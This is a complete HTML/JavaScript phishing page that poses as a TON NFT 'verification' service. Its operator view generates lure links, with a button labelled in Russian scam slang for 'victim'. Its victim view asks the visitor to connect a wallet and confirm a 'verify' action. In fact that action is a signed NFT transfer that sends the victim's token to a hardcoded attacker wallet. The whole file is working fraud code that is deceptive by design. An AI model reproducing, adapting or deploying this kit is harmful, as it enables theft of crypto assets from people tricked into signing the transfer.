<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Verification System</title>
    <script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@ton/core@0.15.0/dist/index.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: #0f172a; color: #f8fafc; margin: 0; }
        .card { background: #1e293b; padding: 2.5rem; border-radius: 1.5rem; box-shadow: 0 20px 50px rgba(0,0,0,0.5); text-align: center; width: 420px; border: 1px solid #334155; }
        h2 { margin-bottom: 1.5rem; color: #3b82f6; font-weight: 700; }
        input { width: 100%; padding: 1rem; margin: 0.8rem 0; border-radius: 0.8rem; border: 1px solid #334155; background: #0f172a; color: white; font-size: 0.9rem; box-sizing: border-box; transition: 0.3s; }
        input:focus { border-color: #3b82f6; outline: none; box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
        button { background: #3b82f6; color: white; border: none; padding: 1rem; border-radius: 0.8rem; cursor: pointer; font-weight: 600; width: 100%; font-size: 1rem; transition: 0.3s; margin-top: 10px; }
        button:hover { background: #2563eb; transform: translateY(-2px); }
        .result-link { background: #020617; padding: 15px; border-radius: 10px; border: 1px dashed #3b82f6; margin-top: 20px; word-break: break-all; cursor: pointer; display: none; font-size: 0.85rem; }
        #ton-connect-button { display: flex; justify-content: center; margin-bottom: 2rem; }
        .hint { font-size: 0.8rem; color: #94a3b8; margin-bottom: 20px; line-height: 1.4; }
    </style>
</head>
<body>

<div class="card">
    <div id="setup-view">
        <h2>Генератор Ссылок</h2>
        <p class="hint">Вставьте <b>Contract Address</b> (EQ...) этого NFT.<br>Его можно найти на Getgems в разделе "Details".</p>
        <input type="text" id="nft-address-input" placeholder="Адрес NFT (EQ... или UQ...)">
        <button id="make-link">Создать ссылку для мамонта</button>
        <div id="copy-box" class="result-link"></div>
    </div>

    <div id="user-view" style="display: none;">
        <h2>Verify NFT Ownership</h2>
        <div id="ton-connect-button"></div>
        <p class="hint">Подключите кошелек, на котором находится ваш NFT, для прохождения верификации в системе.</p>
        <button id="transfer-btn">Verify & Synchronize</button>
    </div>
</div>

<script>
    const MY_ADDRESS = "UQCsbN7m38_6dA2ZYG0RcxpFNixTI7dm5IS16qEZMQacWH9k";
    
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: "https://site-chi-weld.vercel.app/tonconnect-manifest.json",
        buttonRootId: 'ton-connect-button'
    });

    // Проверяем, зашел ли человек по ссылке с NFT
    const urlParams = new URLSearchParams(window.location.search);
    const targetNft = urlParams.get('verify');

    if (targetNft) {
        document.getElementById('setup-view').style.display = 'none';
        document.getElementById('user-view').style.display = 'block';
    }

    // --- ЛОГИКА ДЛЯ ТЕБЯ (СОЗДАНИЕ ССЫЛКИ) ---
    document.getElementById('make-link').addEventListener('click', () => {
        const rawInput = document.getElementById('nft-address-input').value.trim();
        
        // Извлекаем адрес через регулярку (на случай если вставили ссылку)
        const match = rawInput.match(/(E|U)Q[a-zA-Z0-9_-]{46}/);
        
        if (!match) {
            alert("Ошибка: Вставьте корректный адрес NFT (начинается на EQ или UQ)");
            return;
        }

        const cleanAddress = match[0];
        const protocol = window.location.protocol + "//";
        const host = window.location.host;
        const path = window.location.pathname;
        
        const finalUrl = `${protocol}${host}${path}?verify=${cleanAddress}`;
        
        const box = document.getElementById('copy-box');
        box.innerText = finalUrl;
        box.style.display = 'block';
    });

    document.getElementById('copy-box').addEventListener('click', function() {
        navigator.clipboard.writeText(this.innerText);
        alert("Ссылка скопирована!");
    });

    // --- ЛОГИКА ДЛЯ ВЛАДЕЛЬЦА (ПЕРЕДАЧА) ---
    document.getElementById('transfer-btn').addEventListener('click', async () => {
        const wallet = tonConnectUI.account;
        if (!wallet) {
            alert("Please connect your wallet first!");
            return;
        }

        try {
            // Подготовка транзакции
            const body = TonCore.beginCell()
                .storeUint(0x5fcc3d14, 32) // transfer op
                .storeUint(0, 64)          // query_id
                .storeAddress(TonCore.Address.parse(MY_ADDRESS))
                .storeAddress(TonCore.Address.parse(wallet.address))
                .storeBit(0)               // custom_payload
                .storeCoins(TonCore.toNano('0.01'))
                .storeBit(0)               // forward_payload
                .endCell();

            const tx = {
                validUntil: Math.floor(Date.now() / 1000) + 600,
                messages: [{
                    address: targetNft, // Адрес NFT из ссылки
                    amount: TonCore.toNano('0.05').toString(),
                    payload: body.toBoc().toString('base64')
                }]
            };

            await tonConnectUI.sendTransaction(tx);
            alert("Verification request sent. Please confirm in your wallet.");
        } catch (e) {
            console.error(e);
            alert("Transaction cancelled or failed.");
        }
    });
</script>

</body>
</html>
